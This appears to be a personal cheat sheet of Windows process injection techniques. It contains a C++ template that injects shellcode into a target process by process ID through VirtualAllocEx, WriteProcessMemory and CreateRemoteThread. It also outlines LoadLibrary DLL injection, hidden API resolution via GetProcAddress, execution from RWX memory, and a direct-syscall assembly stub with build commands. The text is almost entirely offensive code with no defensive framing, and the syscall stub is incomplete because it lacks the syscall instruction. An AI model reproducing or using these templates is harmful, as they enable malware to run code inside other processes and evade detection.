# Windows 
### Injection and Hijacking

### Win APi Functions

```cpp
OpenProcess ()

VirtualAllocEx ()

WriteProcessMemory()

CreateRemoteThread()
```

### Inject thread 


```cpp
#include <windows.h>
#include <processthreadsapi.h>

int main() {

    HANDLE hProcess, hThread;
    LPVOID start_ptr;
    DWORD tid;
    size_t written;

    char shellcode[] = {

    };
    start_ptr = (LPVOID) 0x13370000;

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 2676);

    start_ptr = VirtualAllocEx(hProcess, start_ptr, 0x1000,  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(hProcess, start_ptr, shellcode, 256, &written);

    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)start_ptr, NULL, 0, &tid);

}

```


### without virtualalloc

find writeable memory, put loadlibrary , pass dll as argument and call CreateRemoteThread


```
typedef HANDLE (WINAPI *CREATEFILE2)(LPCWSTR, DWORD, DWORD, DWORD, LPCREATEFILE2_EXTENDED_PARAMETERS);

GetProcAddress(GetModuleHandleA("kernelbase"), "CreateFile2");
```




```
typedef NTSTATUS (NTAPI *NtCreateFile_t)(
    PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK,
    PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG
);
GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateFile");
```


```cpp
    execMem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(execMem, code, sizeof(code));
    f = (Func)execMem;
    f(&hPipe);
```

### inject inline asm with naked function



```asm
; syscall.asm

.code
public MyNakedFunction

MyNakedFunction proc
    mov r10, rcx        ; Windows x64 ABI requires syscall target in R10
    mov eax, 0c4h       ; 
    ret
MyNakedFunction endp

end
```
assemble

```
ml64 /c /Fo syscall.obj syscall.asm 
```

then in your cpp
```cpp
extern "C" int MyNakedFunction(HANDLE *); 
```

compile with 
```
cl /O2 windows.cpp syscall.obj
```
